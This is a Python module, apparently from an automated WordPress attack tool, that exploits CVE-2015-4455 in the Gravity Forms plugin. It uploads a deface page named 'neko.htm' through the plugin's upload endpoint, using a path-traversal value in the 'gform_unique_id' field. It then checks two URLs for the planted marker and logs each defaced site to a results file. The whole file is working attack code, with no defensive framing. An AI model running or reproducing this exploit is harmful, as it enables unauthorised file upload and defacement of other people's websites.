import requests
import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
index = 'files/rock.jpg'

def Exploit(site):
    try:
        UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
        fileDeface = {'file': open(index, 'rb')}
        post_data = {'field_id': '3', 'form_id': '1', 'gform_unique_id': '../../../../', 'name': 'neko.htm'}
        post_data2 = {'field_id': '3', 'form_id': '1', 'gform_unique_id': '../../../../../', 'name': 'neko.htm'}
        url = "http://" + site + '/?gf_page=upload'
        requests.post(url, files=fileDeface, data=post_data, headers=UserAgent, timeout=5)
        requests.post(url, files=fileDeface, data=post_data2, headers=UserAgent, timeout=5)
        CheckIndex = requests.get('http://' + site + '/_input_3_neko.htm', timeout=5, headers=Headers)
        CheckIndex2 = requests.get('http://' + site + '/wp-content/_input_3_neko.htm',
                                   timeout=5, headers=Headers)
        if 'neko!!' in str(CheckIndex.content):
            with open('result/Index_results.txt', 'a') as writer:
                writer.write(site + '/_input_3_neko.htm' + '\n')
            return printModule.returnYes(site, 'CVE-2015-4455', 'Gravity forms Index', 'Wordpress')
        elif 'neko!!' in str(CheckIndex2.content):
            with open('result/Index_results.txt', 'a') as writer:
                writer.write(site + '/wp-content/_input_3_neko.htm' + '\n')
            return printModule.returnYes(site, 'CVE-2015-4455', 'Gravity forms Index', 'Wordpress')
        else:
            return printModule.returnNo(site, 'CVE-2015-4455', 'Gravity forms Index', 'Wordpress')
    except:
        return printModule.returnNo(site, 'CVE-2015-4455', 'Gravity forms Index', 'Wordpress')
